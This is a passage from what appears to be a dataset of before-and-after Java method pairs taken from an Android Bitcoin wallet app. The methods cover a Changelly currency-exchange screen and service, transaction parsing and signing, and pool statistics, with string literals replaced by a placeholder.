}","@OnClick(R.id.buttonContinue) void createAndSignTransaction(){
  long fromValue=ExactBitcoinCashValue.from(BigDecimal.valueOf(offer.amountFrom)).getLongValue();
  try {
    StandardTransactionBuilder.UnsignedTransaction unsignedTransaction=fromAccount.createUnsignedTransaction(Collections.singletonList(new WalletAccount.Receiver(Address.fromString(offer.payinAddress),fromValue)),MINER_FEE);
    Transaction transaction=fromAccount.signTransaction(unsignedTransaction,AesKeyCipher.defaultKeyCipher());
    WalletAccount account=mbwManager.getSelectedAccount();
    Intent intent=IntentContract.BroadcastTransaction.createIntent(transaction.toBytes());
    WalletApplication.sendToSpv(intent,account.getType());
  }
 catch (  UnableToBuildTransactionException|InsufficientFundsException|OutputTooSmallException|KeyCipher.InvalidKeyCipher e) {
    e.printStackTrace();
  }
}"
91122,"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  accountAdapter=new AccountAdapter(mbwManager,mbwManager.getWalletManager(false).getActiveAccounts(),firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}","@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
      toLayout.setAlpha(Constants.INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  List<WalletAccount> fromAccounts=new ArrayList<>();
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  fromAccounts.addAll(AccountManager.INSTANCE.getCoinapultAccounts().values());
  accountAdapter=new AccountAdapter(mbwManager,fromAccounts,firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}"
91123,"@OnClick(R.id.toValueLayout) void toValueClick(){
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  fromRecyclerView.setVisibility(View.GONE);
  toRecyclerView.setVisibility(View.GONE);
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  valueKeyboard.setMaxValue(BigDecimal.ZERO);
}","@OnClick(R.id.toValueLayout) void toValueClick(){
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(toValue.getText().toString());
  fromRecyclerView.setVisibility(View.GONE);
  toRecyclerView.setVisibility(View.GONE);
  toLayout.setAlpha(Constants.ACTIVE_ALPHA);
  fromLayout.setAlpha(Constants.INACTIVE_ALPHA);
  valueKeyboard.setMaxValue(BigDecimal.ZERO);
}"
91124,"@OnClick(R.id.fromValueLayout) void fromValueClick(){
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  AccountAdapter.Item item=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem());
  valueKeyboard.setMaxValue(getMaxSpend(item.account));
}","@OnClick(R.id.fromValueLayout) void fromValueClick(){
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setEntry(fromValue.getText().toString());
  fromLayout.setAlpha(Constants.ACTIVE_ALPHA);
  toLayout.setAlpha(Constants.INACTIVE_ALPHA);
  AccountAdapter.Item item=fromAccountAdapter.getItem(fromRecyclerView.getSelectedItem());
  valueKeyboard.setMaxValue(getMaxSpend(item.account));
}"
91125,"@Override public void onItemClick(WalletAccount account){
  if (!_mbwManager.getSelectedAccount().equals(account) && account.isActive()) {
    _mbwManager.setSelectedAccount(account.getId());
  }
  toastSelectedAccountChanged(account);
  updateIncludingMenus();
}","@Override public void onItemClick(WalletAccount account){
  if (!_mbwManager.getSelectedAccount().equals(account) && account.isActive()) {
    _mbwManager.setSelectedAccount(account.getId());
  }
  toastSelectedAccountChanged(account);
  accountListAdapter.setFocusedAccount(account);
  updateIncludingMenus();
}"
91126,"public static Transaction fromByteReader(ByteReader reader,Sha256Hash knownTransactionHash) throws TransactionParsingException {
  int size=reader.available();
  try {
    int version=reader.getIntLE();
    int numInputs=(int)reader.getCompactInt();
    TransactionInput[] inputs=new TransactionInput[numInputs];
    for (int i=0; i < numInputs; i++) {
      try {
        inputs[i]=TransactionInput.fromByteReader(reader);
      }
 catch (      TransactionInputParsingException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage(),e);
      }
catch (      IllegalStateException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage(),e);
      }
    }
    int numOutputs=(int)reader.getCompactInt();
    TransactionOutput[] outputs=new TransactionOutput[numOutputs];
    for (int i=0; i < numOutputs; i++) {
      try {
        outputs[i]=TransactionOutput.fromByteReader(reader);
      }
 catch (      TransactionOutputParsingException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage(),e);
      }
    }
    int lockTime=reader.getIntLE();
    return new Transaction(version,inputs,outputs,lockTime,size,knownTransactionHash);
  }
 catch (  InsufficientBytesException e) {
    throw new TransactionParsingException(e.getMessage());
  }
}","public static Transaction fromByteReader(ByteReader reader,Sha256Hash knownTransactionHash) throws TransactionParsingException {
  int size=reader.available();
  try {
    int version=reader.getIntLE();
    int numInputs=(int)reader.getCompactInt();
    TransactionInput[] inputs=new TransactionInput[numInputs];
    for (int i=0; i < numInputs; i++) {
      try {
        inputs[i]=TransactionInput.fromByteReader(reader);
      }
 catch (      TransactionInputParsingException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage(),e);
      }
catch (      IllegalStateException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage(),e);
      }
    }
    int numOutputs=(int)reader.getCompactInt();
    TransactionOutput[] outputs=new TransactionOutput[numOutputs];
    for (int i=0; i < numOutputs; i++) {
      try {
        outputs[i]=TransactionOutput.fromByteReader(reader);
      }
 catch (      TransactionOutputParsingException e) {
        throw new TransactionParsingException(""String_Node_Str"" + i + ""String_Node_Str""+ e.getMessage());
      }
    }
    int lockTime=reader.getIntLE();
    return new Transaction(version,inputs,outputs,lockTime,size,knownTransactionHash);
  }
 catch (  InsufficientBytesException e) {
    throw new TransactionParsingException(e.getMessage());
  }
}"
91127,"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
    }
  }
);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  accountAdapter=new AccountAdapter(mbwManager,mbwManager.getWalletManager(false).getActiveAccounts(),firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}","@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.changelly_activity);
  ButterKnife.bind(this);
  mbwManager=MbwManager.getInstance(this);
  tvMinAmountValue.setVisibility(View.GONE);
  valueKeyboard.setMaxDecimals(8);
  valueKeyboard.setInputListener(new ValueKeyboard.SimpleInputListener(){
    @Override public void done(){
      currencySelector.setVisibility(View.VISIBLE);
      accountSelector.setVisibility(View.VISIBLE);
      titleView.setVisibility(View.VISIBLE);
      subtitleView.setVisibility(View.VISIBLE);
      fromLayout.setAlpha(INACTIVE_ALPHA);
      toLayout.setAlpha(INACTIVE_ALPHA);
    }
  }
);
  fromLayout.setAlpha(INACTIVE_ALPHA);
  toLayout.setAlpha(INACTIVE_ALPHA);
  currencySelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  accountSelector.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.HORIZONTAL,false));
  int senderFinalWidth=getWindowManager().getDefaultDisplay().getWidth();
  int firstItemWidth=(senderFinalWidth - getResources().getDimensionPixelSize(R.dimen.item_dob_width)) / 2;
  currencyAdapter=new CurrencyAdapter(firstItemWidth);
  currencySelector.setAdapter(currencyAdapter);
  currencySelector.setSelectListener(new SelectListener(){
    @Override public void onSelect(    RecyclerView.Adapter adapter,    int position){
      CurrencyAdapter.Item item=currencyAdapter.getItem(position);
      if (item != null) {
        fromCurrency.setText(item.currency);
        fromValue.setText(null);
        minAmount=0.0;
        toValue.setText(""String_Node_Str"");
        Intent changellyServiceIntent=new Intent(ChangellyActivity.this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_MIN_EXCHANGE).putExtra(ChangellyService.FROM,item.currency).putExtra(ChangellyService.TO,ChangellyService.BTC);
        startService(changellyServiceIntent);
      }
    }
  }
);
  accountAdapter=new AccountAdapter(mbwManager,mbwManager.getWalletManager(false).getActiveAccounts(),firstItemWidth);
  accountSelector.setAdapter(accountAdapter);
  accountSelector.setSelectedItem(mbwManager.getSelectedAccount());
  setLayout(ChangellyActivity.ChangellyUITypes.Loading);
  receiver=new Receiver();
  for (  String action : new String[]{ChangellyService.INFO_CURRENCIES,ChangellyService.INFO_EXCH_AMOUNT,ChangellyService.INFO_MIN_AMOUNT,ChangellyService.INFO_TRANSACTION,ChangellyService.INFO_ERROR}) {
    IntentFilter intentFilter=new IntentFilter(action);
    LocalBroadcastManager.getInstance(this).registerReceiver(receiver,intentFilter);
  }
  Intent changellyServiceIntent=new Intent(this,ChangellyService.class).setAction(ChangellyService.ACTION_GET_CURRENCIES);
  startService(changellyServiceIntent);
}"
91128,"@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_CURRENCIES:
    Log.d(TAG,""String_Node_Str"");
  ArrayList<String> currenciesRes=intent.getStringArrayListExtra(ChangellyService.CURRENCIES);
if (currenciesRes != null) {
  Log.d(TAG,""String_Node_Str"" + currenciesRes);
  Collections.sort(currenciesRes);
  List<CurrencyAdapter.Item> itemList=new ArrayList<>();
  itemList.add(new CurrencyAdapter.Item(null,CurrencyAdapter.VIEW_TYPE_PADDING));
  for (  String curr : currenciesRes) {
    if (!curr.equalsIgnoreCase(""String_Node_Str"")) {
      itemList.add(new CurrencyAdapter.Item(curr.toUpperCase(),CurrencyAdapter.VIEW_TYPE_ITEM));
    }
  }
  itemList.add(new CurrencyAdapter.Item(null,CurrencyAdapter.VIEW_TYPE_PADDING));
  currencyAdapter.setItems(itemList);
  setLayout(ChangellyUITypes.Main);
}
break;
case ChangellyService.INFO_MIN_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
CurrencyAdapter.Item item=currencyAdapter.getItem(currencySelector.getSelectedItem());
if (item != null && from != null && to != null && to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(item.currency)) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ from);
minAmount=amount;
tvMinAmountValue.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),item.currency));
}
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
item=currencyAdapter.getItem(currencySelector.getSelectedItem());
if (item != null && from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(item.currency)) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(item.currency)) {
fromValue.setText(decimalFormat.format(amount));
}
avoidTextChangeEvent=false;
}
break;
case INFO_ERROR:
Toast.makeText(ChangellyActivity.this,""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}","@Override public void onReceive(Context context,Intent intent){
  String from, to;
  double amount;
switch (intent.getAction()) {
case ChangellyService.INFO_CURRENCIES:
    Log.d(TAG,""String_Node_Str"");
  ArrayList<String> currenciesRes=intent.getStringArrayListExtra(ChangellyService.CURRENCIES);
if (currenciesRes != null) {
  Log.d(TAG,""String_Node_Str"" + currenciesRes);
  Collections.sort(currenciesRes);
  List<CurrencyAdapter.Item> itemList=new ArrayList<>();
  itemList.add(new CurrencyAdapter.Item(null,CurrencyAdapter.VIEW_TYPE_PADDING));
  for (  String curr : currenciesRes) {
    if (!curr.equalsIgnoreCase(""String_Node_Str"")) {
      itemList.add(new CurrencyAdapter.Item(curr.toUpperCase(),CurrencyAdapter.VIEW_TYPE_ITEM));
    }
  }
  itemList.add(new CurrencyAdapter.Item(null,CurrencyAdapter.VIEW_TYPE_PADDING));
  currencyAdapter.setItems(itemList);
  setLayout(ChangellyUITypes.Main);
}
break;
case ChangellyService.INFO_MIN_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
CurrencyAdapter.Item item=currencyAdapter.getItem(currencySelector.getSelectedItem());
if (item != null && from != null && to != null && to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(item.currency)) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ from);
minAmount=amount;
tvMinAmountValue.setText(getString(R.string.exchange_minimum_amount,decimalFormat.format(minAmount),item.currency));
}
break;
case ChangellyService.INFO_EXCH_AMOUNT:
from=intent.getStringExtra(ChangellyService.FROM);
to=intent.getStringExtra(ChangellyService.TO);
double fromAmount=intent.getDoubleExtra(ChangellyService.FROM_AMOUNT,0);
amount=intent.getDoubleExtra(ChangellyService.AMOUNT,0);
item=currencyAdapter.getItem(currencySelector.getSelectedItem());
if (item != null && from != null && to != null) {
Log.d(TAG,""String_Node_Str"" + amount + ""String_Node_Str""+ to);
avoidTextChangeEvent=true;
try {
if (to.equalsIgnoreCase(ChangellyService.BTC) && from.equalsIgnoreCase(item.currency) && fromAmount == Double.parseDouble(fromValue.getText().toString())) {
toValue.setText(decimalFormat.format(amount));
}
 else if (from.equalsIgnoreCase(ChangellyService.BTC) && to.equalsIgnoreCase(item.currency) && fromAmount == Double.parseDouble(toValue.getText().toString())) {
fromValue.setText(decimalFormat.format(amount));
}
isValueForOfferOk(true);
}
 catch (NumberFormatException ignore) {
}
avoidTextChangeEvent=false;
}
break;
case INFO_ERROR:
Toast.makeText(ChangellyActivity.this,""String_Node_Str"",Toast.LENGTH_LONG).show();
break;
}
}"
91129,"@Override public void done(){
  currencySelector.setVisibility(View.VISIBLE);
  accountSelector.setVisibility(View.VISIBLE);
  titleView.setVisibility(View.VISIBLE);
  subtitleView.setVisibility(View.VISIBLE);
}","@Override public void done(){
  currencySelector.setVisibility(View.VISIBLE);
  accountSelector.setVisibility(View.VISIBLE);
  titleView.setVisibility(View.VISIBLE);
  subtitleView.setVisibility(View.VISIBLE);
  fromLayout.setAlpha(INACTIVE_ALPHA);
  toLayout.setAlpha(INACTIVE_ALPHA);
}"
91130,"@OnClick(R.id.toValue) void clickToValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setEntry(toValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
}","@OnClick(R.id.toLayout) void clickToValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(toValue);
  valueKeyboard.setEntry(toValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
  fromLayout.setAlpha(INACTIVE_ALPHA);
  toLayout.setAlpha(ACTIVE_ALPHA);
}"
91131,"@OnClick(R.id.fromValue) void clickFromValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setEntry(fromValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
}","@OnClick(R.id.fromLayout) void clickFromValue(){
  valueKeyboard.setVisibility(View.VISIBLE);
  valueKeyboard.setInputTextView(fromValue);
  valueKeyboard.setEntry(fromValue.getText().toString());
  currencySelector.setVisibility(View.GONE);
  accountSelector.setVisibility(View.GONE);
  titleView.setVisibility(View.GONE);
  subtitleView.setVisibility(View.GONE);
  fromLayout.setAlpha(ACTIVE_ALPHA);
  toLayout.setAlpha(INACTIVE_ALPHA);
}"
91132,"@Override protected void onHandleIntent(@Nullable Intent intent){
  Log.i(LOG_TAG,""String_Node_Str"");
  if (intent != null && intent.getAction() != null) {
    String from, to, destAddress;
    double amount;
switch (intent.getAction()) {
case ACTION_GET_CURRENCIES:
      if (currencies == null) {
        loadCurrencies();
      }
    if (currencies == null || currencies.size() == 0) {
      Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
      LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
      break;
    }
  Intent currenciesIntent=new Intent(ChangellyService.INFO_CURRENCIES,null,this,ChangellyService.class);
currenciesIntent.putExtra(CURRENCIES,currencies.toArray());
currenciesIntent.putStringArrayListExtra(CURRENCIES,new ArrayList<>(currencies));
LocalBroadcastManager.getInstance(this).sendBroadcast(currenciesIntent);
break;
case ACTION_GET_MIN_EXCHANGE:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
double min=getMinAmount(from,to);
if (min == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent minAmountIntent=new Intent(ChangellyService.INFO_MIN_AMOUNT,null,this,ChangellyService.class);
minAmountIntent.putExtra(FROM,from);
minAmountIntent.putExtra(TO,to);
minAmountIntent.putExtra(AMOUNT,min);
LocalBroadcastManager.getInstance(this).sendBroadcast(minAmountIntent);
break;
case ACTION_GET_EXCHANGE_AMOUNT:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
double offer=getExchangeAmount(from,to,amount);
if (offer == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent exchangeAmountIntent=new Intent(ChangellyService.INFO_EXCH_AMOUNT,null,this,ChangellyService.class);
exchangeAmountIntent.putExtra(FROM,from);
exchangeAmountIntent.putExtra(TO,to);
exchangeAmountIntent.putExtra(AMOUNT,offer);
LocalBroadcastManager.getInstance(this).sendBroadcast(exchangeAmountIntent);
break;
case ACTION_CREATE_TRANSACTION:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
destAddress=intent.getStringExtra(DESTADDRESS);
ChangellyTransactionOffer res=createTransaction(from,to,amount,destAddress);
Intent transactionIntent;
if (res == null) {
transactionIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
}
 else {
transactionIntent=new Intent(ChangellyService.INFO_TRANSACTION,null,this,ChangellyService.class);
res.amountFrom=amount;
transactionIntent.putExtra(OFFER,res);
}
LocalBroadcastManager.getInstance(this).sendBroadcast(transactionIntent);
break;
}
}
}","@Override protected void onHandleIntent(@Nullable Intent intent){
  Log.i(LOG_TAG,""String_Node_Str"");
  if (intent != null && intent.getAction() != null) {
    String from, to, destAddress;
    double amount;
switch (intent.getAction()) {
case ACTION_GET_CURRENCIES:
      if (currencies == null) {
        loadCurrencies();
      }
    if (currencies == null || currencies.size() == 0) {
      Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
      LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
      break;
    }
  Intent currenciesIntent=new Intent(ChangellyService.INFO_CURRENCIES,null,this,ChangellyService.class);
currenciesIntent.putExtra(CURRENCIES,currencies.toArray());
currenciesIntent.putStringArrayListExtra(CURRENCIES,new ArrayList<>(currencies));
LocalBroadcastManager.getInstance(this).sendBroadcast(currenciesIntent);
break;
case ACTION_GET_MIN_EXCHANGE:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
double min=getMinAmount(from,to);
if (min == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent minAmountIntent=new Intent(ChangellyService.INFO_MIN_AMOUNT,null,this,ChangellyService.class);
minAmountIntent.putExtra(FROM,from);
minAmountIntent.putExtra(TO,to);
minAmountIntent.putExtra(AMOUNT,min);
LocalBroadcastManager.getInstance(this).sendBroadcast(minAmountIntent);
break;
case ACTION_GET_EXCHANGE_AMOUNT:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
double offer=getExchangeAmount(from,to,amount);
if (offer == -1) {
Intent errorIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
LocalBroadcastManager.getInstance(this).sendBroadcast(errorIntent);
return;
}
Intent exchangeAmountIntent=new Intent(ChangellyService.INFO_EXCH_AMOUNT,null,this,ChangellyService.class);
exchangeAmountIntent.putExtra(FROM,from);
exchangeAmountIntent.putExtra(TO,to);
exchangeAmountIntent.putExtra(FROM_AMOUNT,amount);
exchangeAmountIntent.putExtra(AMOUNT,offer);
LocalBroadcastManager.getInstance(this).sendBroadcast(exchangeAmountIntent);
break;
case ACTION_CREATE_TRANSACTION:
from=intent.getStringExtra(FROM);
to=intent.getStringExtra(TO);
amount=intent.getDoubleExtra(AMOUNT,0);
destAddress=intent.getStringExtra(DESTADDRESS);
ChangellyTransactionOffer res=createTransaction(from,to,amount,destAddress);
Intent transactionIntent;
if (res == null) {
transactionIntent=new Intent(ChangellyService.INFO_ERROR,null,this,ChangellyService.class);
}
 else {
transactionIntent=new Intent(ChangellyService.INFO_TRANSACTION,null,this,ChangellyService.class);
res.amountFrom=amount;
transactionIntent.putExtra(OFFER,res);
}
LocalBroadcastManager.getInstance(this).sendBroadcast(transactionIntent);
break;
}
}
}"
91133,"public PoolStatisticInfo getStatistics(){
  StatRmcService service=StatRmcFactory.getService();
  long totalRmcHashrate=-1;
  try {
    totalRmcHashrate=service.getCommonHashrate();
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  String address=coluAccount.getAddress().toString();
  long yourRmcHashrate=-1;
  try {
    yourRmcHashrate=service.getHashrate(address);
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  long accruedIncome=-1;
  try {
    accruedIncome=service.getBalance(address);
  }
 catch (  Exception e) {
    Log.e(TAG,""String_Node_Str"",e);
  }
  try {
    Map<String,List<String>> paidTransactions=service.getPaidTransactions(address);
